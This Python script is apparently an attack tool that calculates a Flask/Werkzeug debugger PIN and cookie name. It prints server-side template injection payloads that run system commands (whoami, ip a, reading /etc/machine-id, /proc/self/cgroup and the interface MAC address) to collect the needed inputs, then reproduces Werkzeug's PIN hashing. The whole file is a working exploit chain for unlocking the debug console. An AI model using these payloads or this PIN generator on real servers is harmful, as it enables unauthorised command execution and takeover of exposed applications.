import hashlib
from itertools import chain


q1 = '{'
q2 = '}'
mch_id = b""

print(f"""
To generate a DEBUG PIN, some data is required:
1) Username
Example ssti payload: {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}

2) Interface    
Example ssti payload: {{config.__class__.__init__.__globals__['os'].popen('ip a').read()}}

3) Machine ID
Example ssti payloads: 
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/machine-id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /proc/self/cgroup').read()}}

4) Path to flask app
You need to throw an error and in the error you will see the path to flask
Exmaple path: /home/user/.local/lib/python3.11/site-packages/flask/app.py


""")


def gen_pin(username, mac, mch_id,error):
    probably_public_bits = [username,"flask.app","Flask",error]
    private_bits = [str(mac), mch_id]
    
    rv = None
    num = None
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return [rv, cookie_name]


username = input("1) Enter username: ")
if username != '':
    print("[+] Username collected!")
else:
    exit(0)


interface = input("2) Enter interface: ")
if interface != '':
    print("[+] Interface collected!")
else:
    exit(0)

print(f"""
Now we need the MAC address of this interface
Example ssti payload: {q1}{q1}config.__class__.__init__.__globals__['os'].popen('cat /sys/class/net/{interface}/address').read(){q2}{q2}
""")

mac_not_int = input("2.1) Enter MAC address: ")
mac = int("".join(mac_not_int.split(":")),16)
if mac_not_int != '':
    print("[+] Mac collected!")
else:
    exit(0)




mch_id_file = input("3) Enter machine-id: ")
if mch_id_file != '':
    print("[+] Machine-id collected!")
else:
    exit(0)


cgroup_file = input("3.1) Enter cgroup: ")
if cgroup_file != '':
    print("[+] cgroup collected!")
else:
    exit(0)


mch_id_file = mch_id_file.encode("UTF-8")
cgroup_file = cgroup_file.strip().rpartition("/")[2].encode("UTF-8")

mch_id += mch_id_file
mch_id += cgroup_file

error = input("4) Enter path to flask app: ")
if error != '':
    print("[+] Flask path collected!")
else:
    exit(0)

res = gen_pin(username, mac,mch_id,error)
if res[0] != '' and res[1] != '':
    print("[+] SUCCESS!")
    print(f'PIN: {res[0]}\nCookie_name = {res[1]}')





